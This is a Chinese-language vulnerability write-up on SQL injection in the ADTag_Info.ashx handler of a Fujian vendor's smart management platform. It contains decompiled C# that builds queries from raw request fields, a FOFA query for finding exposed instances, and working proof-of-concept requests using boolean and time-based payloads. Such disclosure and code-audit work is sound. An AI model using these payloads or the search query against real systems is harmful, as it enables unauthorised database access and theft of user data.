---
title: "银达汇智智慧综合管理平台 ADTag_Info.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/windor-Module-BPCJ-AD_Tag-Controller-ADTag_Info-sqli.html
asset_dir: assets/银达汇智智慧综合管理平台-adtag_info.ashx-sql注入漏洞
---

# 银达汇智智慧综合管理平台 ADTag\_Info.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/28 08:16
- 881浏览
- [0评论](#comment)
- 3小时阅读

深入探索

Windows安全工具

Web安全课程

数据库

---

# 漏洞简介

福建银达汇智信息科技股份有限公司成立于2009年，位于福建省福州市，是一家以从事[软件](#)和信息技术服务业为主的企业。银达汇智智慧综合管理平台 `ADTag_Info.ashx` 存在[SQL注入](https://mrxn.net/tag/SQL注入)漏洞,攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

# fofa语法

> `title="智慧综合管理平台登入"`

# 漏洞分析

先看 `ADTag_Info.ashx` 页面引用的dll

代码安全审计

```
<%@ WebHandler Language="C#" CodeBehind="ADTag_Info.ashx.cs" Class="KR.Administrator.Module.Controller.ADTag_Info"  %>
```

其中 `Module/AD/AD_Tag/Controller/ADTag_Info.ashx` 和 `Module/BPCJ/AD_Tag/Controller/ADTag_Info.ashx` 代码一致，分析其中之一即可。

再看 `KR.Administrator.Module.Controller.ADTag_Info` 的业务逻辑实现

```
namespace KR.Administrator.Module.Controller;

public class ADTag_Info : IHttpHandler, IRequiresSessionState
{
  private ADInfoDao bll = new ADInfoDao();

  public void ProcessRequest(HttpContext context)
  {
    context.Response.ContentType = "text/plain";
    string str1 = WRequest.GetString("action");
    try
    {
      if (string.op_Equality(str1, "find"))
      {
        int recordcount = 0;
        string strWhere = " 1=1 ";
        if (!string.IsNullOrEmpty(WRequest.GetString("Ad_Id")))
          strWhere += $" and ADTypePreID = '{WRequest.GetString("Ad_Id")}'";
        DataTable dataTableList = this.bll.GetDataTableList(WRequest.GetInt("pagesize") == 0 ? 20 : WRequest.GetInt("pagesize"), WRequest.GetInt("pageIndex") == 0 ? 1 : WRequest.GetInt("pageIndex") + 1, "*", $" {(string.IsNullOrEmpty(WRequest.GetString("SortField")) ? (object) "id" : (object) WRequest.GetString("SortField"))} {(string.IsNullOrEmpty(WRequest.GetString("SortOrder")) ? (object) "desc" : (object) WRequest.GetString("SortOrder"))}", strWhere, out recordcount);
        DataGridModel dataGridModel = new DataGridModel()
        {
          total = recordcount,
          data = dataTableList
        };
        context.Response.Write(JsonConvert.SerializeObject((object) dataGridModel));
        KR.Controls.Log.LogHelper.SysInfo("：查看！", new Exception(context.Request.Form.ToString()));
      }
      else if (string.op_Equality(str1, "save"))
        this.save(context);
      else if (string.op_Equality(str1, "look") || string.op_Equality(str1, "update"))
      {
        Windor.JR.Model.ADInfo adInfo = this.bll.GetItem((long) WRequest.GetInt("id"));
        context.Response.Write(JsonConvert.SerializeObject((object) adInfo));
      }
      else if (string.op_Equality(str1, "selectedDel"))
      {
        if (SystemHelper.checkPermission("ADInfo_btnDel"))
        {
          string str2 = WRequest.GetString("ids");
          if (!string.IsNullOrEmpty(str2))
          {
            IList<Windor.JR.Model.ADInfo> list = (IList<Windor.JR.Model.ADInfo>) this.bll.GetList($"id in ({str2}) ");
            KR.Controls.Log.LogHelper.SysInfo("：删除！", new Exception(JsonConvert.SerializeObject((object) list)));
            StringBuilder stringBuilder = new StringBuilder();
            foreach (Windor.JR.Model.ADInfo adInfo in (IEnumerable<Windor.JR.Model.ADInfo>) list)
            {
              stringBuilder.Append(adInfo.id);
              stringBuilder.Append(",");
            }
            this.bll.Delete((ICondition) new Condition("id", FieldType.Int32, (object) stringBuilder.ToString().Trim(new char[1]
            {
              ','
            }), Comparison.In));
            context.Response.Write(SystemHelper.WriteResult("success", "删除成功！"));
          }
          else
            context.Response.Write(SystemHelper.WriteResult("error", "请选择要删除项！"));
        }
        else
          context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
      }
      else if (string.op_Equality(str1, "conditionDel"))
      {
        if (SystemHelper.checkPermission("ADInfo_btnDel"))
        {
          string strWhere = " 1=1 ";
          if (!string.IsNullOrEmpty(WRequest.GetString("ADId")))
            strWhere += $" and ADId like '%{WRequest.GetString("ADId")}%'";
          if (!string.IsNullOrEmpty(WRequest.GetString("StartDateBegin")))
            strWhere += $" and StartDate >= '{WRequest.GetString("StartDateBegin")}'";
          if (!string.IsNullOrEmpty(WRequest.GetString("StartDateEnd")))
            strWhere += $" and StartDate < '{WRequest.GetString("StartDateEnd")}'";
          if (!string.IsNullOrEmpty(WRequest.GetString("EndDateBegin")))
            strWhere += $" and EndDate >= '{WRequest.GetString("EndDateBegin")}'";
          if (!string.IsNullOrEmpty(WRequest.GetString("EndDateEnd")))
            strWhere += $" and EndDate < '{WRequest.GetString("EndDateEnd")}'";
          if (!string.IsNullOrEmpty(WRequest.GetString("Caption")))
            strWhere += $" and Caption like '%{WRequest.GetString("Caption")}%'";
          if (!string.IsNullOrEmpty(WRequest.GetString("ADTypeBegin")))
            strWhere += $" and ADType >= {WRequest.GetString("ADTypeBegin")}";
          if (!string.IsNullOrEmpty(WRequest.GetString("ADTypeEnd")))
            strWhere += $" and ADType < {WRequest.GetString("ADTypeEnd")}";
          if (!string.IsNullOrEmpty(WRequest.GetString("ContentTypeBegin")))
            strWhere += $" and ContentType >= {WRequest.GetString("ContentTypeBegin")}";
          if (!string.IsNullOrEmpty(WRequest.GetString("ContentTypeEnd")))
            strWhere += $" and ContentType < {WRequest.GetString("ContentTypeEnd")}";
          if (!string.IsNullOrEmpty(WRequest.GetString("Content")))
            strWhere += $" and Content like '%{WRequest.GetString("Content")}%'";
          if (!string.IsNullOrEmpty(WRequest.GetString("OrgId")))
            strWhere += $" and OrgId like '%{WRequest.GetString("OrgId")}%'";
          if (!string.IsNullOrEmpty(WRequest.GetString("ADTypePreID")))
            strWhere += $" and ADTypePreID like '%{WRequest.GetString("ADTypePreID")}%'";
          if (!string.IsNullOrEmpty(WRequest.GetString("org_idBegin")))
            strWhere += $" and org_id >= {WRequest.GetString("org_idBegin")}";
          if (!string.IsNullOrEmpty(WRequest.GetString("org_idEnd")))
            strWhere += $" and org_id < {WRequest.GetString("org_idEnd")}";
          IList<Windor.JR.Model.ADInfo> list = (IList<Windor.JR.Model.ADInfo>) this.bll.GetList(strWhere);
          KR.Controls.Log.LogHelper.SysInfo("：删除！", new Exception(JsonConvert.SerializeObject((object) list)));
          StringBuilder stringBuilder = new StringBuilder();
          foreach (Windor.JR.Model.ADInfo adInfo in (IEnumerable<Windor.JR.Model.ADInfo>) list)
          {
            stringBuilder.Append(adInfo.id);
            stringBuilder.Append(",");
          }
          if (stringBuilder.Length > 0)
          {
            this.bll.Delete((ICondition) new Condition("id", FieldType.Int32, (object) stringBuilder.ToString().Trim(new char[1]
            {
              ','
            }), Comparison.In));
            context.Response.Write(SystemHelper.WriteResult("success", "删除成功！"));
          }
          else
            context.Response.Write(SystemHelper.WriteResult("error", "未找到符合条件的数据！"));
        }
        else
          context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
      }
      else if (string.op_Equality(str1, "exportExcel"))
        this.exportExcel(context);
      else if (string.op_Equality(str1, "findAD_Type"))
      {
        DataTable adType = this.bll.getAD_Type();
        context.Response.Write(JsonConvert.SerializeObject((object) adType));
      }
      else if (string.op_Equality(str1, "findCheckData"))
      {
        string empty = string.Empty;
        DataTable dataTable = new DataTable();
        if (!string.IsNullOrEmpty(WRequest.GetString("TagId")))
          dataTable = this.bll.getInfoCheckData(WRequest.GetString("TagId"));
        context.Response.Write(JsonConvert.SerializeObject((object) dataTable));
      }
      else
        context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
    }
    catch (Exception ex)
    {
      KR.Controls.Log.LogHelper.SysError($"：操作异常！action:{str1};Form:{context.Request.Form.ToString()}", ex);
      context.Response.Write(SystemHelper.WriteResult("error", ex.Message.Replace("\"", "'")));
    }
  }

  private void save(HttpContext context)
  {
    Windor.JR.Model.ADInfo model = new Windor.JR.Model.ADInfo();
    model.id = WRequest.GetInt("id");
    if (model.id != 0)
    {
      model = this.bll.GetItem((long) model.id);
      if (model == null)
      {
        context.Response.Write(SystemHelper.WriteResult("error", "数据保存失败！指定的记录不存在或已经被其他用户删除！"));
        return;
      }
    }
    model.ADId = string.IsNullOrEmpty(WRequest.GetString("ADId").Trim()) ? Guid.NewGuid() : new Guid(WRequest.GetString("ADId").Trim());
    model.StartDate = string.IsNullOrEmpty(WRequest.GetString("StartDate")) ? new DateTime?() : WRequest.GetString("StartDate").ToDateTime();
    model.EndDate = string.IsNullOrEmpty(WRequest.GetString("EndDate")) ? new DateTime?() : WRequest.GetString("EndDate").ToDateTime();
    model.Caption = WRequest.GetString("Caption").Trim();
    model.ADType = WRequest.GetInt("ADType");
    model.ContentType = WRequest.GetInt("ContentType");
    model.Content = WRequest.GetString("Content").Trim();
    model.OrgId = WRequest.GetString("OrgId").Trim();
    if (!string.IsNullOrEmpty(WRequest.GetString("ADTypePreID").Trim()))
      model.ADTypePreID = new Guid(WRequest.GetString("ADTypePreID").Trim());
    model.org_id = WRequest.GetInt("org_id");
    bool flag1;
    bool flag2;
    if (model.id != 0)
    {
      if (SystemHelper.checkPermission("ADInfo_btnUpdate"))
      {
        flag1 = this.bll.Update(model);
        KR.Controls.Log.LogHelper.SysInfo(string.Format("：修改！", new object[0]), new Exception(JsonConvert.SerializeObject((object) model)));
        flag2 = true;
      }
      else
      {
        context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
        return;
      }
    }
    else if (SystemHelper.checkPermission("ADInfo_btnAdd"))
    {
      flag1 = this.bll.Add(model) > 0L;
      KR.Controls.Log.LogHelper.SysInfo(string.Format("：新增！", new object[0]), new Exception(JsonConvert.SerializeObject((object) model)));
      flag2 = false;
    }
    else
    {
      context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
      return;
    }
    if (flag1)
    {
      if (flag2)
        context.Response.Write(SystemHelper.WriteResult("success", "修改成功！", "update"));
      else
        context.Response.Write(SystemHelper.WriteResult("success", "新增成功！", "add"));
    }
    else
      context.Response.Write(SystemHelper.WriteResult("error", "数据保存失败！操作过程中出现异常！"));
  }

  private void exportExcel(HttpContext context)
  {
    string condition = " 1=1 ";
    if (!string.IsNullOrEmpty(WRequest.GetString("sADId")))
      condition += $" and ADId like '%{WRequest.GetString("sADId")}%'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sStartDateBegin")))
      condition += $" and StartDate >= '{WRequest.GetString("sStartDateBegin")}'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sStartDateEnd")))
      condition += $" and StartDate < '{WRequest.GetString("sStartDateEnd")}'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sEndDateBegin")))
      condition += $" and EndDate >= '{WRequest.GetString("sEndDateBegin")}'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sEndDateEnd")))
      condition += $" and EndDate < '{WRequest.GetString("sEndDateEnd")}'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sCaption")))
      condition += $" and Caption like '%{WRequest.GetString("sCaption")}%'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sADTypeBegin")))
      condition += $" and ADType >= {WRequest.GetString("sADTypeBegin")}";
    if (!string.IsNullOrEmpty(WRequest.GetString("sADTypeEnd")))
      condition += $" and ADType < {WRequest.GetString("sADTypeEnd")}";
    if (!string.IsNullOrEmpty(WRequest.GetString("sContentTypeBegin")))
      condition += $" and ContentType >= {WRequest.GetString("sContentTypeBegin")}";
    if (!string.IsNullOrEmpty(WRequest.GetString("sContentTypeEnd")))
      condition += $" and ContentType < {WRequest.GetString("sContentTypeEnd")}";
    if (!string.IsNullOrEmpty(WRequest.GetString("sContent")))
      condition += $" and Content like '%{WRequest.GetString("sContent")}%'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sOrgId")))
      condition += $" and OrgId like '%{WRequest.GetString("sOrgId")}%'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sADTypePreID")))
      condition += $" and ADTypePreID like '%{WRequest.GetString("sADTypePreID")}%'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sorg_idBegin")))
      condition += $" and org_id >= {WRequest.GetString("sorg_idBegin")}";
    if (!string.IsNullOrEmpty(WRequest.GetString("sorg_idEnd")))
      condition += $" and org_id < {WRequest.GetString("sorg_idEnd")}";
    DataTable dataTabelToExcel = this.bll.GetDataTabelToExcel(KR.Controls.RunTime.Global.webSiteConfig.ExportCount, condition);
    if (((InternalDataCollectionBase) dataTabelToExcel.Rows).Count <= 0)
      return;
    SystemHelper.CreateExcel(dataTabelToExcel, "application/x-excel", DateTime.Now.ToString("yyyyMMddHHmmssfff"), context, "导出Excel表");
  }

  public bool IsReusable => false;
}
```

在`ADTag_Info`类的`ProcessRequest`方法中，多个操作（如`find`、`conditionDel`、`selectedDel`、`exportExcel`、`findCheckData`）直接使用用户可控参数拼接SQL语句，未进行有效的过滤或参数化处理，导致攻击者可构造恶意输入执行任意SQL命令。

漏洞扫描服务

其中 `selectedDel`、`conditionDel` 以及 `save` 均需要权限验证，暂不考虑。重点看其他几个处理逻辑。

`findCheckData` 里将获取的 `TagId` 直接带入 `getInfoCheckData` 方法，看下其实现如下

```
public DataTable getInfoCheckData(string TagId)
  {
    string sql = $"select ai.* from AD_Tag at \r\n                        inner join dbo.AD_Info_Tag_Mod ait on CONVERT(varchar(100),at.TagId) = ait.TagID\r\n                        inner join AD_Info ai on ai.ADId = ait.AD_Info_ID\r\n                        where at.TagId = '{TagId}'";
    return DbHelperFactory.GetDbHelper().Query(sql).Tables[0];
  }
```

在`getInfoCheckData`方法中，直接使用用户输入的`TagId`参数拼接SQL语句，未进行任何过滤或参数化处理，导致攻击者可通过构造恶意输入执行任意SQL命令。但是 `find` 的this.bll.GetDataTableList 构造使用储存过程执行sql，存不存在sql注入取决于储存过程 `UP_GetRecordByPage` 的写法。

物流软件安全

```
public override DataTable GetDataTableList(
  string tableOrView,
  int PageSize,
  int PageIndex,
  string fieldName,
  string orderFields,
  string strWhere,
  out int recordcount)
{
  if ((object) this.Model == null)
    throw new InvalidOperationException("无效的 Model 属性，在调用本函数前请先设置 Model 属性。");
  SqlParameter[] sqlParameterArray1 = new SqlParameter[6]
  {
    new SqlParameter("@tblName", (SqlDbType) 22, -1),
    new SqlParameter("@fieldName", (SqlDbType) 22, -1),
    new SqlParameter("@OrderField", (SqlDbType) 22, -1),
    new SqlParameter("@PageSize", (SqlDbType) 8),
    new SqlParameter("@PageIndex", (SqlDbType) 8),
    new SqlParameter("@strWhere", (SqlDbType) 22, -1)
  };
  int num1 = 0;
  SqlParameter[] sqlParameterArray2 = sqlParameterArray1;
  int index1 = num1;
  int num2 = index1 + 1;
  ((DbParameter) sqlParameterArray2[index1]).Value = (object) tableOrView;
  SqlParameter[] sqlParameterArray3 = sqlParameterArray1;
  int index2 = num2;
  int num3 = index2 + 1;
  ((DbParameter) sqlParameterArray3[index2]).Value = !string.IsNullOrEmpty(fieldName) ? (object) fieldName : (object) " * ";
  SqlParameter[] sqlParameterArray4 = sqlParameterArray1;
  int index3 = num3;
  int num4 = index3 + 1;
  ((DbParameter) sqlParameterArray4[index3]).Value = !string.IsNullOrEmpty(orderFields) ? (object) orderFields : (object) this.Model.GetPrimaryFields();
  SqlParameter[] sqlParameterArray5 = sqlParameterArray1;
  int index4 = num4;
  int num5 = index4 + 1;
  ((DbParameter) sqlParameterArray5[index4]).Value = (object) PageSize;
  SqlParameter[] sqlParameterArray6 = sqlParameterArray1;
  int index5 = num5;
  int num6 = index5 + 1;
  ((DbParameter) sqlParameterArray6[index5]).Value = (object) PageIndex;
  SqlParameter[] sqlParameterArray7 = sqlParameterArray1;
  int index6 = num6;
  int num7 = index6 + 1;
  ((DbParameter) sqlParameterArray7[index6]).Value = !string.IsNullOrEmpty(strWhere) ? (object) strWhere : (object) "";
  DataSet dataSet = this.CurrentHelper.ExecuteProcedure("UP_GetRecordByPage", "ds", (IDataParameter[]) sqlParameterArray1);
  recordcount = 0;
  if (((InternalDataCollectionBase) dataSet.Tables).Count > 0)
    recordcount = Convert.ToInt32(dataSet.Tables[1].Rows[0][0].ToString());
  return dataSet.Tables[0];
}
```

如果是如下写法

编程

```
DECLARE @sql NVARCHAR(MAX)
SET @sql = 'SELECT ... FROM ' + @tblName + ' WHERE 1=1 ' + @strWhere + ' ORDER BY ...'
EXEC(@sql)
```

那么传入的 `@strWhere` 里的内容**不会再参数化**，而是直接拼在SQL字符串中执行，则会造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

整体执行流程如下图所示：

# 漏洞复现

## action=findCheckData

```
POST /Module/BPCJ/AD_Tag/Controller/ADTag_Info.ashx HTTP/1.1
Host: windor.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=findCheckData&TagId='or '1'='1
```

[![银达汇智智慧综合管理平台 ADTag_Info.ashx SQL注入漏洞](images/img-001-4f014ef4af84.webp)](https://image.mrxn.net/e578133f05e74c808fc3b7094b2a9046.webp)

布尔注入，结果出现差异

代码安全审计

[![银达汇智智慧综合管理平台 ADTag_Info.ashx SQL注入漏洞](images/img-002-ec18972b510d.webp)](https://image.mrxn.net/746d4a3039cc4a6ca0db618669bb149d.webp)

## action=exportExcel

```
POST /Module/BPCJ/AD_Tag/Controller/ADTag_Info.ashx HTTP/1.1
Host: windor.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=exportExcel&sADId='waitfor+delay'0:0:4'--
```

[![银达汇智智慧综合管理平台 ADTag_Info.ashx SQL注入漏洞](images/img-003-776a89ce906a.webp)](https://image.mrxn.net/f655d3b6a88b4d76aa58168d35fbca7f.webp)

成功延时 4 秒

编程

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.action=findCheckData](#toc-5-1-)
- [5.2.action=exportExcel](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
